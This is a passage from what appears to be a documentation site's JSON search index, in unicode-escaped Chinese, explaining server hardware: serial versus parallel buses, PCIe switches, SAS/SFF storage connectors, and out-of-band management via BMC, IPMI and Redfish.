\u5b58\u50a8\u8bbe\u5907\u8fde\u63a5\u5c42\u6b21","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/knowledge/#\u603b\u7ebf","title":"\u603b\u7ebf","text":"<p>\u603b\u7ebf\u53d1\u5c55\u7684\u8d8b\u52bf\u662f\u4ece\u5e76\u884c\u6f14\u53d8\u4e3a\u4e32\u884c\uff1a</p> <ul> <li>\u5e76\u884c\u5c31\u662f\u7528\u591a\u6839\u7ebf\u540c\u65f6\u4f20\u8f93\u6570\u636e\uff0c\u4e32\u884c\u5c31\u662f\u7528\u4e00\u6839\u7ebf\u987a\u5e8f\u4f20\u8f93\u6570\u636e\u3002\u770b\u8d77\u6765\u4e32\u884c\u6162\uff0c\u4f46\u5e76\u884c\u5360\u7528\u7a7a\u95f4\u5927\uff0cI/O \u5f15\u811a\u8fc7\u591a\u53d8\u5f97\u65e0\u6cd5\u63a5\u53d7\uff0c\u4e14\u968f\u7740\u4f20\u8f93\u901f\u7387\u7684\u63d0\u9ad8\u51fa\u73b0\u4e86\u96be\u4ee5\u89e3\u51b3\u7684\u4e32\u6270\u95ee\u9898\u3002</li> <li>\u8fd9\u4e24\u79cd\u603b\u7ebf\u67b6\u6784\u4e0d\u540c\uff1a\u4e32\u884c\u603b\u7ebf\u53ea\u80fd\u70b9\u5bf9\u70b9\u8fde\u63a5\u4e24\u4e2a\u8bbe\u5907\uff0c\u800c\u5e76\u884c\u603b\u7ebf\u53ef\u4ee5\u5728\u5355\u4e00\u603b\u7ebf\u4e0a\u8fde\u63a5\u591a\u4e2a\u8bbe\u5907\uff0c\u5e76\u4e14\u5f88\u5bb9\u6613\u589e\u51cf\u603b\u7ebf\u4e0a\u7684\u8bbe\u5907\u3002\u5bf9\u4e8e\u4e32\u884c\u603b\u7ebf\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u4ea4\u6362\u673a\u548c\u591a\u4e2a\u603b\u7ebf\u8bbe\u5907\u8fde\u63a5\u3002</li> </ul>      PCI \u4e0e PCIe \u603b\u7ebf      <p>Example</p> <ul> <li>PCI\uff08Peripheral Component Interconnect\uff09\u662f\u5e76\u884c\u603b\u7ebf\uff0cPCIe\uff08PCI Express\uff09\u662f\u4e32\u884c\u603b\u7ebf\u3002</li> <li>ATA\uff08Advanced Technology Attachment\uff09\u662f\u5e76\u884c\u603b\u7ebf\uff0cSATA\uff08Serial ATA\uff09\u662f\u4e32\u884c\u603b\u7ebf\u3002</li> <li>SCSI\uff08Small Computer System Interface\uff09\u662f\u5e76\u884c\u603b\u7ebf\uff0cSAS\uff08Serial Attached SCSI\uff09\u662f\u4e32\u884c\u603b\u7ebf\u3002</li> <li>USB\uff08Universal Serial Bus\uff09\u662f\u4e32\u884c\u603b\u7ebf\u3002</li> </ul> <p>CPU \u53ef\u4ee5\u76f4\u8fde\u51fa PCIe \u603b\u7ebf\uff0c\u800c SATA/SAS/USB \u7b49\u603b\u7ebf\u603b\u662f\u7531\u82af\u7247\u7ec4/\u63a7\u5236\u5668\u5f15\u51fa\u3002\u5982\u4eca\u7684\u9ad8\u901f\u5b58\u50a8\u90fd\u5f00\u59cb\u4f7f\u7528 PCIe \u603b\u7ebf\uff0c\u5982 NVMe SSD\u3002</p>      SATA \u4e0e PCIe \u5b58\u50a8\u5bf9\u6bd4","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/knowledge/#pcie-switch","title":"PCIe Switch","text":"<p>Quote</p> <ul> <li>Top 3 Uses for PCI Express Switches</li> </ul> <p>PCIe Switch \u662f\u4e00\u79cd\u7528\u4e8e\u6269\u5c55 PCIe \u603b\u7ebf\u7684\u8bbe\u5907\uff0c\u53ef\u4ee5\u5c06\u4e00\u4e2a PCIe \u603b\u7ebf\u6269\u5c55\u4e3a\u591a\u4e2a PCIe \u603b\u7ebf\u3002\u5b83\u5229\u7528\u4e86 PCIe \u4e32\u884c\u603b\u7ebf\u70b9\u5bf9\u70b9\u901a\u4fe1\u7684\u7279\u70b9\u3002\u5b83\u7684\u5e94\u7528\u573a\u666f\u6709\uff1a</p> <ul> <li> <p>\u6269\u5c55 PCIe \u603b\u7ebf\uff1a\u5c06\u4e00\u4e2a PCIe \u603b\u7ebf\u6269\u5c55\u4e3a\u591a\u4e2a PCIe \u603b\u7ebf\uff0c\u53ef\u4ee5\u8fde\u63a5\u591a\u4e2a PCIe \u8bbe\u5907\u3002\u591a\u89c1\u4e8e GPU \u670d\u52a1\u5668\uff0c\u4e00\u822c\u4e3a 4U\uff0c\u652f\u6301 8 \u5361\uff0c\u6bd4\u5982\u6211\u4eec\u7684\u5b81\u7545 X640 G40\u3002</p> <p>\u5982\u4e0b\u56fe\u6240\u793a\uff0cCPU \u53ea\u9700\u8981\u5411 PCIe Switch \u63d0\u4f9b x4 PCIe\uff0c\u5c31\u80fd\u6269\u5c55\u51fa 4 \u4e2a x4 PCIe \u8bbe\u5907\u548c\u4e00\u4e2a x1 PCIe \u8bbe\u5907\u3002\u5f53\u7136\u8fd9\u80af\u5b9a\u4f1a\u6709\u5ef6\u8fdf\u3001\u5e26\u5bbd\u4e4b\u7c7b\u7684\u635f\u5931\uff0c\u6bd4\u5982\u5728\u8be5 PCIe Switch \u4e0b\u7684\u6240\u6709\u8bbe\u5907 Host to Device \u7684\u603b\u5e26\u5bbd\u53ea\u80fd\u5c40\u9650\u5728 x4\uff0c\u4f46\u662f Device to Device \u5e26\u5bbd\u4e00\u822c\u53ef\u4ee5\u8fbe\u5230\u6ee1\u901f\u3002</p> <p></p>      PCIe Switch \u6269\u5c55 PCIe \u603b\u7ebf      <p></p> </li> <li> <p>\u62c6\u5206 PCIe \u603b\u7ebf\uff1a\u5c06\u4e00\u4e2a PCIe \u603b\u7ebf\u62c6\u5206\u4e3a\u591a\u4e2a PCIe \u603b\u7ebf\uff0c\u53ef\u4ee5\u8fde\u63a5\u591a\u4e2a PCIe \u8bbe\u5907\u3002\u591a\u89c1\u4e8e PCIe \u8f6c\u63a5\u5361\u3002\u8fd9\u91cc\u5c31\u4e0d\u4f1a\u6709\u603b\u5e26\u5bbd\u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u8bbe\u5907\u90fd\u6709\u72ec\u7acb\u7684 PCIe \u603b\u7ebf\u3002</p> <p>Example</p> <p>\u6bd4\u5982\u6709\u4e00\u4e9b PCIe x16 \u8f6c 4 U.2 \u7684\u8f6c\u63a5\u5361\uff08\u56e0\u4e3a U.2 \u6bcf\u4e2a\u53ea\u5360 x4 \u901a\u9053\uff09\u3002\u8fd9\u4e9b\u81ea\u5e26 PCIe Switch \u7684\u8f6c\u63a5\u5361\u4e0d\u9700\u8981\u4e3b\u677f\u652f\u6301 PCIe \u62c6\u5206\uff08PCie Bifurcation\uff09\u3002\u800c\u6bd4\u8f83\u4fbf\u5b9c\u7684 PCIe x16 \u8f6c 4 U.2 \u8f6c\u63a5\u5361\u5c31\u4e0d\u5e26 PCIe Switch\uff0c\u9700\u8981\u4e3b\u677f\u652f\u6301 PCIe \u62c6\u5206\u3002\u8fd9\u5c31\u662f\u4ef7\u683c\u5dee\u5f02\u7684\u539f\u56e0\u3002</p> <p></p>      PCIe Switch \u62c6\u5206 PCIe \u603b\u7ebf      <p></p> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/knowledge/#\u63a5\u53e3","title":"\u63a5\u53e3","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/knowledge/#sata","title":"SATA","text":"<p>\u4f20\u7edf\u673a\u68b0\u786c\u76d8\u90fd\u662f SATA \u63a5\u53e3\uff0c\u4e00\u822c\u4e3a SATA3\uff0c\u901f\u7387 6Gb/s\u3002</p>      SATA \u63a5\u53e3","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/knowledge/#sas","title":"SAS","text":"<p>\u65e2\u53ef\u4ee5\u79f0\u4e3a\u4e00\u79cd\u63a5\u53e3\uff0c\u4e5f\u662f\u4e00\u79cd\u534f\u8bae\u3002\u8fd9\u79cd\u63a5\u53e3\u80fd\u591f\u517c\u5bb9 SATA \u534f\u8bae\uff0c\u652f\u6301 SAS \u534f\u8bae\uff0c\u5e76\u8fdb\u4e00\u6b65\u652f\u6301\u4e86 PCIe \u901a\u9053\u3002\u8fd9\u79cd\u63a5\u53e3\u5177\u6709\u591a\u79cd\u7248\u672c\uff0c\u66f4\u65b0\u7684\u7248\u672c\u4f7f\u7528\u66f4\u591a\u5f15\u811a\uff0c\u652f\u6301\u66f4\u9ad8\u7684\u901f\u7387\u3002\u56e0\u4e3a\u79cd\u7c7b\u4f17\u591a\uff0c\u63a5\u53e3\u540d\u79f0\u4e5f\u5341\u5206\u6df7\u4e71\u3002</p> <p>SAS \u534f\u8bae\u7531 T10 \u6280\u672f\u59d4\u5458\u4f1a\u5236\u5b9a\uff0c\u8be5\u59d4\u5458\u4f1a\u8d1f\u8d23 SCSI \u548c SAS \u4ee5\u53ca\u76f8\u5173\u6807\u51c6\u3002SAS \u4f7f\u7528\u7684\u63a5\u53e3\u7531 SFF TA TWG \u5236\u5b9a\uff0c\u8be5\u5de5\u4f5c\u7ec4\u8fd8\u8d1f\u8d23 QSFP \u7b49\u63a5\u53e3\u6807\u51c6\u3002\u4ed6\u4eec\u5236\u5b9a\u7684\u534f\u8bae\u76f8\u4e92\u7ec4\u5408\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u7279\u5b9a\u901f\u7387\u7684\u63a5\u53e3\uff0c\u6bd4\u5982 12GB/s \u7684\u63a5\u53e3\u5c31\u4f7f\u7528\u4e86\u5982\u4e0b\u6807\u51c6\u76f8\u4e92\u534f\u4f5c\uff1a</p>      SAS \u63a5\u53e3\u4e0e\u534f\u8bae\u4e4b\u95f4\u7684\u5173\u7cfb      <ul> <li> <p>SFF-8482 Serial Attachment 2X Unshielded Connector\uff1a\u53ef\u4ee5\u770b\u5230\u5b83\u5728 SATA \u63a5\u53e3\u7684\u7f3a\u53e3\u90e8\u5206\u6dfb\u52a0\u4e86\u5f15\u811a\u3002\u8fd9\u79cd\u63a5\u53e3\u7684\u786c\u76d8\u652f\u6301 3\u30016\u300112Gb/s \u901f\u7387\u3002\u4e00\u822c\u8bf4 SAS \u6307\u7684\u90fd\u662f\u8fd9\u79cd\u63a5\u53e3\uff0c\u4f01\u4e1a\u7ea7\u673a\u68b0\u786c\u76d8\u666e\u904d\u4f7f\u7528\u8be5\u63a5\u53e3\u3002</p> <p></p>      SFF-8482 \u63a5\u53e3      <p></p> </li> <li> <p>SFF-8630 Serial Attachment 4X Unshielded Connector\uff1a\u5728\u80cc\u9762\u6dfb\u52a0\u4e86\u66f4\u591a\u5f15\u811a\u3002\u8fd9\u79cd\u63a5\u53e3\u4e0d\u591a\u89c1\u3002</p> <p></p>      SFF-8630 \u63a5\u53e3      <p></p> </li> <li> <p>SFF-8639 Multifunction 6X Unshielded Connector\uff1a\u80cc\u9762\u6392\u6ee1\u4e86\u5f15\u811a\u3002\u8fd9\u4e00\u63a5\u53e3\u6807\u51c6\u5b9a\u4e49\u4e86 4x PCIe \u901a\u9053\uff0c\u4e5f\u79f0\u4e3a U.2 \u63a5\u53e3\u3002\u8be5\u63a5\u53e3\u666e\u904d\u7528\u4e8e\u4f01\u4e1a\u7ea7 2.5 \u5bf8 NVMe SSD\u3002</p> <p></p>      SFF-8639 \u63a5\u53e3           U.2 \u4e0e U.3 \u5f15\u811a\u5b9a\u4e49      <p></p> </li> </ul> <p>\u4e0a\u9762\u63cf\u8ff0\u7684\u63a5\u53e3\u4e00\u822c\u4f4d\u4e8e\u5b58\u50a8\u8bbe\u5907\uff0c\u6241\u5e73\u7684\u63a5\u53e3\u5360\u7528\u9762\u79ef\u8f83\u5927\uff0c\u56e0\u6b64\u53c8\u5b9a\u4e49\u4e86\u4e00\u65cf Mini \u7248\u7684\u63a5\u53e3\uff0c\u5e38\u89c1\u4e8e\u4e3b\u677f\u3001PCIe \u8f6c\u63a5\u5361\u4e0a\uff0c\u5b83\u4eec\u4e5f\u88ab\u7528\u4e8e PCIe \u8bbe\u5907\u8fde\u63a5\uff1a</p> <ul> <li> <p>SFF-8613 Mini Multilane 4/8X Unshielded Connector (HDun)\u3001SFF-8614 Mini Multilane 4/8X Shielded Cage/ Connector (HDsh)\uff1a\u5206\u6210\u6709\u5c4f\u853d/\u65e0\u5c4f\u853d\u4e24\u79cd\uff0c\u524d\u8005\u5e38\u7528\u4e8e\u786c\u76d8\u80cc\u677f\u3002\u6211\u4eec\u7684 GPU \u673a\u67dc\u4f7f\u7528\u6709\u5c4f\u853d\u7684\u7248\u672c\uff0c\u90e8\u5206 DAS\uff08\u76f4\u8fde\u5b58\u50a8\uff09\u8bbe\u5907\u4e5f\u4f7f\u7528\u8fd9\u79cd\u63a5\u53e3\u3002\u53c8\u79f0\u4e3a Mini-SAS HD\u3002</p> <p></p>      SFF-8613 \u63a5\u53e3           SFF-8614 \u63a5\u53e3      <p></p> </li> <li> <p>SFF-8086 Mini Multilane 4X 10 Gb/s Common Elements Connector\u3001SFF-8087 Mini Multilane 4X Unshielded Connector Shell and Plug\u3001SFF-8088 Mini Multilane 4X Shielded Connector Shell and Plug \uff1a\u786c\u76d8\u80cc\u677f\u5e38\u7528\u8be5\u63a5\u53e3\u8fde\u63a5\u5230\u4e3b\u677f\uff0c\u56e0\u4e3a\u5b83\u80fd\u62c6\u5206\u51fa 4 \u6761 SATA \u901a\u9053\u3002\u5b83\u5206\u6210\u6709\u5c4f\u853d/\u65e0\u5c4f\u853d\u4e24\u79cd\u3002\u53c8\u79f0\u4e3a Mini-SAS\u3002</p> <p></p>      SFF-8087 \u63a5\u53e3           SFF-8088 \u63a5\u53e3      <p></p> </li> <li> <p>SFF-8654 0.6mm 4/8X Unshielded I/O Connector\uff1a\u6bd4\u8f83\u65b0\u7684\u652f\u6301 U.2/NVMe \u7684\u786c\u76d8\u80cc\u677f\u4e00\u822c\u91c7\u7528\u8fd9\u79cd\u63a5\u53e3\u8fde\u63a5\u5230\u4e3b\u677f\uff0c\u5b83\u652f\u6301 PCIe \u901a\u9053\u3002\u53c8\u79f0\u4e3a SlimSAS\u3002</p> <p></p>      SFF-8654 \u63a5\u53e3\uff088X\uff0c\u6b64\u5916\u8fd8\u6709 4X\uff09      <p></p> </li> <li> <p>SFF-8611 MiniLink 4/8X I/O Cable Assemblies\uff1a\u670d\u52a1\u5668\u4e0a\u5e76\u4e0d\u5e38\u89c1\u3002\u53c8\u79f0\u4e3a oculink\uff0c\u7528\u4e8e\u8fde\u63a5 PCIe \u8bbe\u5907\uff0c\u5982 GPU\u3002</p> <p></p>      SFF-8611 \u63a5\u53e3      <p></p> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/oobm/","title":"\u5e26\u5916\u7ba1\u7406","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/oobm/#\u5e26\u5916\u7ba1\u7406","title":"\u5e26\u5916\u7ba1\u7406","text":"<p>Todo</p> <ul> <li> Redfish Ansible \u81ea\u52a8\u5316\u4ecb\u7ecd</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/oobm/#\u6982\u8ff0","title":"\u6982\u8ff0","text":"<p>\u5e26\u5916\u7ba1\u7406\uff08Out-of-Band Management\uff0cOOBM\uff09\u662f\u4e00\u79cd\u901a\u8fc7\u72ec\u7acb\u4e8e\u751f\u4ea7\u7f51\u7edc\u7684\u7ba1\u7406\u5e73\u9762\u8bbf\u95ee\u548c\u7ba1\u7406\u8fdc\u7a0b\u4f4d\u7f6e\u7684\u8bbe\u5907\u548c\u57fa\u7840\u8bbe\u65bd\u7684\u8fc7\u7a0b\u3002\u5e26\u5916\u7ba1\u7406\u5141\u8bb8\u7cfb\u7edf\u7ba1\u7406\u5458\u901a\u8fc7\u8fdc\u7a0b\u63a7\u5236\u76d1\u89c6\u548c\u7ba1\u7406\u670d\u52a1\u5668\u53ca\u5176\u4ed6\u7f51\u7edc\u9644\u52a0\u8bbe\u5907\uff0c\u65e0\u8bba\u8be5\u8bbe\u5907\u662f\u5426\u5df2\u542f\u52a8\u6216\u64cd\u4f5c\u7cfb\u7edf\u662f\u5426\u5df2\u5b89\u88c5\u6216\u6b63\u5e38\u8fd0\u884c\u3002\u5b83\u4e0e\u5e26\u5185\u7ba1\u7406\u76f8\u5bf9\uff0c\u540e\u8005\u8981\u6c42\u88ab\u7ba1\u7406\u7cfb\u7edf\u5df2\u542f\u52a8\u5e76\u901a\u8fc7\u5176\u64cd\u4f5c\u7cfb\u7edf\u7684\u7f51\u7edc\u8bbe\u65bd\u53ef\u7528\u3002</p> <p>\u5728\u670d\u52a1\u5668\u4e0a\uff0c\u5e26\u5916\u7ba1\u7406\u901a\u8fc7\u72ec\u7acb\u7684\u57fa\u677f\u7ba1\u7406\u63a7\u5236\u5668\uff08Baseboard Management Controller\uff0cBMC\uff09\u82af\u7247\u5b9e\u73b0\u3002\u53ea\u8981\u670d\u52a1\u5668\u4e0a\u7535\uff0c\u5b83\u5c31\u5f00\u59cb\u5de5\u4f5c\uff0c\u76d1\u6d4b\u786c\u4ef6\u72b6\u6001\uff0c\u63d0\u4f9b\u8fdc\u7a0b\u63a7\u5236\u548c\u76d1\u89c6\u529f\u80fd\u3002BMC \u901a\u5e38\u5305\u62ec\u4e00\u4e2a\u5d4c\u5165\u5f0f Web \u670d\u52a1\u5668\uff0c\u8fde\u63a5\u5230\u72ec\u7acb\u7684\u7f51\u7edc\u63a5\u53e3\uff0c\u53ef\u4ee5\u901a\u8fc7 IPMI\u3001Redfish \u6216\u5176\u4ed6\u534f\u8bae\u8bbf\u95ee\u3002Linux Foundation \u53d1\u8d77\u4e86 OpenBMC \u9879\u76ee\uff0c\u65e8\u5728\u5b9a\u4e49\u6807\u51c6\u7684 BMC \u56fa\u4ef6\u6808\uff0c\u4f46\u5728\u53ef\u4ee5\u9884\u89c1\u7684\u672a\u6765\uff0c\u5404\u4e2a\u5382\u5546\u7684 BMC \u4ecd\u7136\u4f1a\u6709\u4e00\u5b9a\u7684\u5dee\u5f02\u3002</p>      BMC \u67b6\u6784           \u4e0d\u540c\u670d\u52a1\u5668\u5382\u5546\u7684\u5e26\u5916\u7ba1\u7406\u540d\u79f0      <p>IPMI\uff08Intelligent Platform Management Interface\uff09\u662f\u4e00\u79cd\u6807\u51c6\u7684\u786c\u4ef6\u7ba1\u7406\u63a5\u53e3\uff0cBMC \u5b9e\u73b0\u4e86 IPMI \u6807\u51c6\uff0c\u53ef\u4ee5\u901a\u8fc7 IPMI \u534f\u8bae\u8fdb\u884c\u8fdc\u7a0b\u7ba1\u7406\u3002Redfish \u662f\u4e00\u79cd\u65b0\u7684\u786c\u4ef6\u7ba1\u7406\u63a5\u53e3\uff0c\u57fa\u4e8e RESTful API\uff0c\u9010\u6e10\u53d6\u4ee3 IPMI\u3002\u51e0\u4e4e\u6240\u6709\u670d\u52a1\u5668\u90fd\u652f\u6301 IPMI\uff0c\u76ee\u524d\u5e02\u552e\u7684\u670d\u52a1\u5668\u4e5f\u5927\u90fd\u652f\u6301 Redfish\u3002</p> <p>\u5173\u4e8e\u5e26\u5916\u7ba1\u7406\u6280\u672f\u7684\u53d1\u5c55\uff0c\u53ef\u4ee5\u770b\u4e0b\u9762\u8fd9\u7bc7\u6587\u7ae0\uff1a</p> \u4e91\u670d\u52a1\u5668\u5e26\u5916\u7ba1\u7406\uff1a\u4ece IPMI \u5230 RedFish - CSDN <p>1998 \u5e74\uff0cIPMI \u7684\u51fa\u73b0\u8ba9\u8fd9\u4e00\u5207\u597d\u4e86\u4e0d\u5c11\u3002\u7531 Intel \u548c HP \u4e3b\u63a8\u7684 IPMI \u6807\u51c6\uff0c\u5f15\u5165\u4e86\u5355\u72ec\u7684\u5e26\u5916\u7ba1\u7406\u82af\u7247 BMC\uff1a</p> <p>\u6240\u8c13\u7684\u5e26\u5916\uff0c\u662f\u6307\u5728 CPU \u8fd9\u4e2a\u4e3b\u8ba1\u7b97\u8d44\u6e90\u4e4b\u5916\u3002\u6709\u4e86\u8fd9\u4e2a ARM based \u82af\u7247\u52a0\u6301\uff0c\u548c\u5f00\u653e\u514d\u8d39\u7684 IPMI \u6807\u51c6\uff0c\u670d\u52a1\u5668\u7684\u7ba1\u7406\u4e0a\u4e86\u4e00\u4e2a\u53f0\u9636\u3002IPMI \u5b9a\u4e49\u4e86\u4e00\u4e2a\u6240\u8c13\u7684\u670d\u52a1\u5668\u7ba1\u7406\u7684\u6700\u5c0f\u96c6\uff0c\u5e76\u6807\u51c6\u5316\u4e86\u76f8\u5173\u547d\u4ee4\u96c6\u5408\u3002IPMI \u6d88\u606f\u91c7\u7528\u7edf\u4e00\u683c\u5f0f\uff0c\u5b83\u7684\u4e0b\u5c42\u662f\u900f\u660e\u7684\uff0c\u53ef\u4ee5\u67b6\u6784\u5728\u7f51\u7edc\u3001\u4e32\u884c/Moderm \u63a5\u53e3\u3001IPMB\uff08I2C\uff09\u3001KCS\u3001SMIC\u3001SMBus \u7b49\u4e0d\u540c\u63a5\u53e3\u4e0a\u3002\u5982 BIOS \u548c BMC \u4e4b\u95f4\u7684 IPMI \u6d88\u606f\u662f\u5728 KCS \u6216\u8005 IPMB \u7ba1\u9053\u4e2d\uff0c\u800c\u8fdc\u7a0b\u63a7\u5236 Console \u5219\u548c BMC \u901a\u8fc7\u7f51\u7edc\u53d1\u9001 IPMI \u6d88\u606f\u3002IPMI \u7684\u5f15\u5165\u6781\u5927\u7684\u65b9\u4fbf\u4e86\u670d\u52a1\u5668\u7684\u8fdc\u7a0b\u7ba1\u7406\u3002\u5c3d\u7ba1 IPMI \u6807\u51c6\u89c4\u5b9a\u7684\u529f\u80fd\u5341\u5206\u6709\u9650\uff0c\u4f46\u5404\u4e2a\u670d\u52a1\u5668\u5382\u5546\u5219\u767e\u82b1\u9f50\u653e\uff0c\u5728\u5176\u57fa\u7840\u4e0a\u6269\u5c55\u4e86\u5f88\u591a\u5b9e\u7528\u7684\u529f\u80fd\uff0c\u5305\u62ec Remote Console\uff08KVM\uff0c\u6ce8\u610f\u4e0d\u662f\u865a\u62df\u673a\u4e16\u754c\u90a3\u4e2a KVM\uff09\uff0cRemote Media \u7b49\u7b49\u65b0\u9c9c\u5b9e\u7528\u7684\u529f\u80fd\u3002\u6211\u53ef\u4ee5\u5750\u5728\u6211\u7684 cubicle \u91cc\uff0c\u628a\u6211\u7684\u7b14\u8bb0\u672c\u4e0a\u63d2\u7684 U \u76d8 Remote Mount \u5230\u67d0\u4e2a\u670d\u52a1\u5668\u4e2d\uff0c\u66f4\u65b0\u5176\u4e2d\u7684 BIOS \u6216\u8005\u64cd\u4f5c\u7cfb\u7edf\uff0c\u5e76\u901a\u8fc7 KVM \u76d1\u89c6\u8fdb\u5ea6\u3002\u592a\u65b9\u4fbf\u4e86\u3002</p> <p>\u4f46\u9690\u60a3\u5df2\u7ecf\u57cb\u4e0b\uff0c\u8fd9\u4e9b\u7e41\u6742\u7684\u529f\u80fd\u6ca1\u6709\u7edf\u4e00\u7684\u6807\u51c6\uff0c\u5404\u5bb6\u90fd\u4e0d\u901a\u7528\uff0c\u800c\u4e00\u4e2a\u4e91\u670d\u52a1\u5382\u5546\u4e3a\u4e86\u4fdd\u969c\u4f9b\u5e94\u94fe\u5f80\u5f80\u4f1a\u91c7\u8d2d\u4e0d\u540c\u7684\u54c1\u724c\u7684\u670d\u52a1\u5668\uff0c\u4ece\u800c\u9020\u6210\u4e86\u6781\u5927\u7684\u6df7\u4e71\u3002IPMI \u66f4\u591a\u7684\u662f\u5355\u70b9\u7684\u670d\u52a1\uff0c\u6269\u5c55\u6027\uff08Scale Out\uff09\u5dee\u3002\u800c\u8fd9\u4e9b\u4ec5\u4ec5\u662f\u5f00\u59cb\uff0c\u5728\u5b83\u53d1\u660e\u7684\u540e\u5f88\u957f\u65f6\u95f4\uff0cIPMI \u7684\u7ba1\u7406\u7f51\u7edc\u662f\u4e00\u4e2a\u4e13\u6709\u7684\u7f51\u7edc\uff0c\u53ea\u6709\u6388\u6743\u7684\u7528\u6237\u624d\u80fd\u8bbf\u95ee\uff0c\u8fd9\u5bfc\u81f4\u5176\u5728\u5f00\u59cb\u8bbe\u8ba1\u7684\u65f6\u5019\u5c31\u5bf9\u5b89\u5168\u6027\u8003\u8651\u6709\u6240\u6b20\u7f3a\u3002\u5728\u7206\u51fa\u5b89\u5168\u6f0f\u6d1e\u540e\uff0cIPMI2.0 \u589e\u52a0\u4e86\u589e\u5f3a\u8eab\u4efd\u8ba4\u8bc1\uff08RAKP+\u3001SHA-1 \u7b49\uff09\uff0c\u4f46\u5176\u540e\u66f4\u6709\u522b\u7684\u6f0f\u6d1e\u7206\u51fa\u3002\u4e1a\u754c\u547c\u5524\u4e00\u79cd\u65b0\u7684\uff0c\u91cd\u65b0\u8bbe\u8ba1\u7684\u65b0\u6807\u51c6\uff0c\u4e00\u52b3\u6c38\u9038\u7684\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\uff0c\u4e8e\u662f RedFish \u5e94\u8fd0\u800c\u751f\uff0cIPMI \u4e5f\u5728 2015 \u5e74\u516c\u5e03 2.0 v1.1 \u6807\u51c6\u540e\uff0c\u4e0d\u518d\u66f4\u65b0\uff0c\u88ab RedFish \u6c38\u4e45\u4ee3\u66ff\uff0cIntel \u4e5f\u5ba3\u5e03\u4e0d\u518d\u7ef4\u62a4\uff0c\u53f7\u53ec\u5927\u5bb6\u8f6c\u6218 RedFish\u3002</p> <p>RedFish \u6807\u51c6\u7531 DMTF \u7ec4\u7ec7\u7684 SPMF \u8bba\u575b\u7ef4\u62a4\u3002\u5b83\u7684\u521d\u59cb\u63d0\u51fa\u8005\u548c IPMI \u521d\u59cb\u63d0\u51fa\u8005\u51e0\u4e4e\u4e00\u6837\uff0c\u4e3a Intel\uff0cHPE\uff08HP \u62c6\u5206\uff09\uff0cDell \u548c Emerson\u3002\u5728\u6807\u51c6\u8ba2\u7acb\u4e4b\u521d\uff0c\u5c31\u8bbe\u5b9a\u4e86\u4ee5\u4e0b\u76ee\u6807\uff1a</p> <ul> <li>\u5b89\u5168</li> <li>\u9ad8\u53ef\u6269\u5c55\u7ba1\u7406\uff08Scalable\uff09</li> <li>\u4eba\u7c7b\u53ef\u8bfb\u6570\u636e\u754c\u9762\uff08Human readable data\uff09</li> <li>\u57fa\u4e8e\u73b0\u6709\u786c\u4ef6\u53ef\u5b9e\u73b0</li> </ul> <p>\u7b2c\u56db\u6761\u5341\u5206\u6d45\u663e\u6613\u61c2\uff0c\u4e5f\u5c31\u662f\u73b0\u5728\u652f\u6301 IPMI \u7684 BMC \u4e0a\uff0c\u4e0d\u9700\u8981\uff08\u6216\u8005\u5f88\u5c0f\uff09\u786c\u4ef6\u6539\u52a8\uff0c\u5c31\u53ef\u4ee5\u652f\u6301 RedFish\uff0c\u4e5f\u5c31\u662f\u786c\u4ef6\u517c\u5bb9\u3002\u5b89\u5168\u6027\u4f9d\u8d56 TLS-Secured HTTP\uff0c\u4e5f\u5c31\u662f HTTPS \u6765\u4fdd\u8bc1\u3002\u9ad8\u53ef\u6269\u5c55\u6027\u901a\u8fc7\u5b9a\u4e49\u6240\u6709\u7684 API \u4e3a RESTful \u5f62\u5f0f\u7684 API \u6765\u5b8c\u6210\u3002REST\uff08REpresent State Transfer\uff0cREST\uff09\uff0c\u8fd9\u4e2a\u6982\u5ff5\u4ece Web API \u800c\u6765\uff0c\u76f8\u5bf9\u4e8e\u4f20\u7edf\u7684 SOAP API\uff0cRESTful \u7684 API \u5b9a\u4e49\u5f88\u7b80\u5355\uff08\u5982\uff1aPOST\uff0cGET\uff0cPUT \u6216 DELETE\uff09\uff0c\u5c06\u5bf9\u8c61\u7684\u72b6\u6001 State\uff0c\u7528 JSON \u6216 XML \u683c\u5f0f\u5728\u670d\u52a1\u5668\u548c Client \u4e4b\u95f4\u4f20\u9012\uff0c\u8fd9\u4e5f\u662f\u5b83\u7684\u540d\u5b57\u7684\u7531\u6765\u3002</p> <p>\u8fd9\u4e9b\u8bbf\u95ee\u7684\u6570\u636e\u683c\u5f0f\u90fd\u662f JSON \u5f62\u6001\u7684\u6570\u636e\u3002JSON(JavaScript Object Notation) \u8131\u80ce\u4e8e JavaScript\uff0c\u4e0d\u8fc7\u8fd9\u5e76\u4e0d\u4ee3\u8868 JSON \u65e0\u6cd5\u4f7f\u7528\u4e8e\u5176\u4ed6\u8bed\u8a00\uff0c\u5b83\u73b0\u5728\u8fc5\u901f\u6210\u4e3a\u4e00\u79cd\u73b0\u4ee3\u6570\u636e\u683c\u5f0f\u3002\u5b83\u6bd4 XML \u7b80\u5355\uff0c\u4e5f\u662f\u5b9e\u73b0\u4eba\u7c7b\u53ef\u8bfb\u6570\u636e\u754c\u9762\u7684\u91cd\u8981\u624b\u6bb5\u3002\u5173\u4e8e\u5b83\u6211\u5c31\u4e0d\u5c55\u5f00\u4e86\uff0c\u7f51\u4e0a\u8d44\u6599\u5f88\u591a\u3002 \u5149\u6709 RESTful API \u548c JSON \u683c\u5f0f\u6570\u636e\u662f\u4e0d\u591f\u7684\u3002RedFish \u8fd8\u5f15\u5165 OData\uff0c\u5b9a\u4e49\u4e86\u4e00\u7ec4\u5e38\u89c1\u7684 RESTful Schema\uff0c\u63d0\u4f9b API \u4e4b\u95f4\u7684\u4e92\u64cd\u4f5c\u6027\u3002\u5982\u63cf\u8ff0 JSON \u6709\u6548\u8d1f\u8f7d\u7684\u6a21\u5f0f\u3001URL \u7ea6\u5b9a\u3001\u901a\u7528\u5c5e\u6027\u7b49\u7b49\u3002</p> <p>\u81ea RedFish \u5728 2014 